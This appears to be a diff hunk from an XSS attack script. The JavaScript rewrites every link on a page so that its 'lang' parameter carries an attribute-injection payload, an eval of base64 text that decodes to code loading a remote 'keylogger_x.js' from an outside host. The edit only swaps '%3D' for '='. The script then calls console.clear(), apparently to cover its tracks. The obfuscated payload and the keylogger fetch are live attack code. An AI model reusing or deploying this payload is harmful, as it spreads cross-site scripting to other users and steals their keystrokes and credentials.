@@ -26,7 +26,7 @@ fetch(newUrl)
         var links = document.querySelectorAll('a');
         links.forEach(a => {
             let l = new URL(a.href)
-            l.searchParams.set("lang","\"onload%3D\"eval(atob('Y29uc3Qgbm9kZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO25vZGUuc2V0QXR0cmlidXRlKCJzcmMiLCJodHRwczovL2N0cGFjaGUuZ2l0aHViLmlvL1hTUy9rZXlsb2dnZXJfeC5qcyIpO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0uYXBwZW5kQ2hpbGQobm9kZSk7'))")
+            l.searchParams.set("lang","\"onload=\"eval(atob('Y29uc3Qgbm9kZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO25vZGUuc2V0QXR0cmlidXRlKCJzcmMiLCJodHRwczovL2N0cGFjaGUuZ2l0aHViLmlvL1hTUy9rZXlsb2dnZXJfeC5qcyIpO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0uYXBwZW5kQ2hpbGQobm9kZSk7'))")
             a.setAttribute('href',l.href)
         });
         console.clear();
